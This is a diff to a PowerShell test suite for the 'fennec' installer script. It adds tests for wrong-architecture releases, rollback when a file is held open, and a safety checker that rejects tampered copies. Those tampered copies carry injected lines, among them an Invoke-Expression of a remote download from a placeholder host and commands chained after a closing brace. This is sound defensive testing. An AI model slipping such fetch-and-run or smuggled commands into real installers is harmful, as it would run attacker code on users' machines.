@@ -13,8 +13,9 @@
 # or this machine's, each installing nothing; it installs over a running
 # server; a zip carrying the mark of the web installs programs carrying none;
 # run through iex it leaves the session's settings as they were, and a
-# failure there fails the line; and a copy cut short at any point runs
-# nothing. It prints what Windows does with the mark: whether
+# failure there fails the line; a copy cut short at any point runs
+# nothing; and tools/install-ps1-check.ps1 passes the script and fails a copy
+# made to run a command. It prints what Windows does with the mark: whether
 # Invoke-WebRequest marks what it downloads, and whether Expand-Archive
 # carries a zip's mark onto what it unpacks.
 
@@ -145,6 +146,12 @@ try {
     $old = Join-Path $work 'oldsite'
     New-Item -ItemType Directory -Path (Join-Path $old 'latest\download') | Out-Null
     [IO.File]::WriteAllText((Join-Path $old 'latest\download\SHA256SUMS'), "$('0' * 64)  fennec-v0.1.12-x86_64-unknown-linux-musl.tar.gz`n")
+    # A release with the other processor's Windows zip alone: an arm64 machine
+    # takes no x86_64 build in place of its own, and an x86_64 one no arm64.
+    $other = if ($target -eq 'x86_64-pc-windows-msvc') { 'aarch64-pc-windows-msvc' } else { 'x86_64-pc-windows-msvc' }
+    $wrong = Join-Path $work 'wrongsite'
+    New-Item -ItemType Directory -Path (Join-Path $wrong 'latest\download') | Out-Null
+    [IO.File]::WriteAllText((Join-Path $wrong 'latest\download\SHA256SUMS'), "$('0' * 64)  fennec-v0.1.12-x86_64-unknown-linux-musl.tar.gz`n$('0' * 64)  fennec-v0.1.12-$other.zip`n")
 
     # A server on a port the system picks, found by the file it writes.
     $python = Get-Command python, py -CommandType Application -ErrorAction SilentlyContinue | Select-Object -First 1
@@ -178,6 +185,7 @@ server.serve_forever()
     $port = (Get-Content -LiteralPath $portFile -Raw).Trim()
     $base = "http://127.0.0.1:$port/site"
     $oldBase = "http://127.0.0.1:$port/oldsite"
+    $wrongBase = "http://127.0.0.1:$port/wrongsite"
 
     $before = Snapshot
 
@@ -248,6 +256,26 @@ server.serve_forever()
         Expect "$tag once it stopped: exit 0" ($rc -eq 0) (Out latest)
         Expect "$tag once it stopped: the old file removed" (@(Files $bin).Count -eq 2) (@(Files $bin) -join ', ')
 
+        # The second program cannot be replaced -- its file held open without
+        # the right to rename it, as a backup agent or an antivirus can: the
+        # first, already replaced, is put back, and the message says so.
+        $rc = Install rollback
+        Expect "$tag rollback: a first install" ($rc -eq 0) (Out rollback)
+        $rbin = Join-Path (Inst rollback) 'bin'
+        [IO.File]::WriteAllText((Join-Path $rbin 'fennec.exe'), 'the old fennec.exe')
+        $held = [IO.File]::Open((Join-Path $rbin 'fennec-server.exe'), 'Open', 'Read', 'Read')
+        try {
+            $rc = Install rollbackagain @{ FENNEC_INSTALL = (Inst rollback) }
+        } finally {
+            $held.Dispose()
+        }
+        Expect "$tag rollback: fails" ($rc -ne 0) (Out rollbackagain)
+        Expect "$tag rollback: names the file it could not write" ((Out rollbackagain).Contains('could not write')) (Out rollbackagain)
+        Expect "$tag rollback: says the first is back" ((Out rollbackagain).Contains('fennec.exe is back as it was')) (Out rollbackagain)
+        Expect "$tag rollback: the first is the old one" ((Text (Join-Path $rbin 'fennec.exe')) -ceq 'the old fennec.exe') (Text (Join-Path $rbin 'fennec.exe'))
+        Expect "$tag rollback: the second is the one that was there" (Says (Join-Path $rbin 'fennec-server.exe') "fennec-server $Version")
+        Expect "$tag rollback: the two programs and nothing else" (@(Files $rbin).Count -eq 2) (@(Files $rbin) -join ', ')
+
         # Already on the PATH: nothing to say about it.
         $onpath = Join-Path (Inst onpath) 'bin'
         $rc = Install onpath @{ Path = "$onpath;$env:Path" }
@@ -272,6 +300,14 @@ server.serve_forever()
         Expect "$tag no Windows build: fails" ($rc -ne 0)
         Expect "$tag no Windows build: names the target" ((Out nowindows).Contains("lists no build for $target")) (Out nowindows)
         Expect "$tag no Windows build: installs nothing" (-not (Test-Path (Inst nowindows)))
+        Expect "$tag no Windows build: names the release" ((Out nowindows).Contains('the latest release (v0.1.12)')) (Out nowindows)
+
+        # The other processor's zip is listed, this one's is not: refused, the
+        # release named, nothing taken in its place.
+        $rc = Install wrongarch @{ FENNEC_BASE_URL = $wrongBase }
+        Expect "$tag only the other processor's zip: fails" ($rc -ne 0)
+        Expect "$tag only the other processor's zip: names the target and the release" ((Out wrongarch).Contains("the latest release (v0.1.12) lists no build for $target")) (Out wrongarch)
+        Expect "$tag only the other processor's zip: installs nothing" (-not (Test-Path (Inst wrongarch)))
 
         # A zip that is not the one the sums name: a byte added.
         $served = Join-Path $rel $name
@@ -414,6 +450,37 @@ Write-Host "cuts run: $count"
         $rc = Run $shell @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $cutDriver, $script, $cutList) $cutOut @{ FENNEC_BASE_URL = $base; FENNEC_INSTALL = (Inst cut) }
         Expect "$tag cut short ($($cuts.Count) cuts): every cut tried" ((Text $cutOut).Contains("cuts run: $($cuts.Count)")) (Text $cutOut)
         Expect "$tag cut short: nothing runs" (-not (Test-Path (Inst cut)) -and -not (Text $cutOut).Contains('Looking for')) (Text $cutOut)
+
+        # The check that holds the file safe to run through iex
+        # (tools/install-ps1-check.ps1, also run by site/build.py before the
+        # site ships it) passes the file and fails each copy made to run
+        # something: a command invoked inside Install-Fennec, one chained
+        # after a function's closing brace on the same line -- both of which a
+        # reading of the file's lines let through -- and Add-Type.
+        $checker = (Resolve-Path -LiteralPath (Join-Path (Join-Path $PSScriptRoot '..') 'tools\install-ps1-check.ps1')).Path
+        $call = 'Invoke-FennecInstall $args $tmp'
+        Expect "$tag the check's anchor is in the script" ($text.Contains($call))
+        $mutants = [ordered]@{
+            'invoke-expression in Install-Fennec' = $text.Replace($call, "Invoke-Expression (irm 'https://example.invalid/x')`n        $call")
+            'add-type in Install-Fennec'          = $text.Replace($call, "Add-Type -TypeDefinition 'public class FennecX {}'`n        $call")
+            'a command after a closing brace'     = ([regex]'(?m)^}(?=\r?$)').Replace($text, '}; New-Item -ItemType Directory -Path pwned', 1)
+            'a command before the call'           = $text.Replace('Install-Fennec @args', "New-Item -ItemType Directory -Path pwned`nInstall-Fennec @args")
+        }
+        $checked = Join-Path $work "$tag-check.ps1"
+        [IO.File]::WriteAllText($checked, $text)
+        $checkOut = Join-Path $work "$tag-check.out"
+        $rc = Run $shell @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $checker, $checked) $checkOut
+        Expect "$tag the check passes the script" ($rc -eq 0) (Text $checkOut)
+        $m = 0
+        foreach ($what in $mutants.Keys) {
+            $m++
+            $copy = Join-Path $work "$tag-mutant$m.ps1"
+            Expect "$tag the check's copy with $what differs" ($mutants[$what] -cne $text)
+            [IO.File]::WriteAllText($copy, $mutants[$what])
+            $copyOut = Join-Path $work "$tag-mutant$m.out"
+            $rc = Run $shell @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $checker, $copy) $copyOut
+            Expect "$tag the check fails a copy with $what" ($rc -ne 0) (Text $copyOut)
+        }
 
         # What Windows does with the mark, printed: whether Invoke-WebRequest
         # marks a download, from the internet and from this machine, and
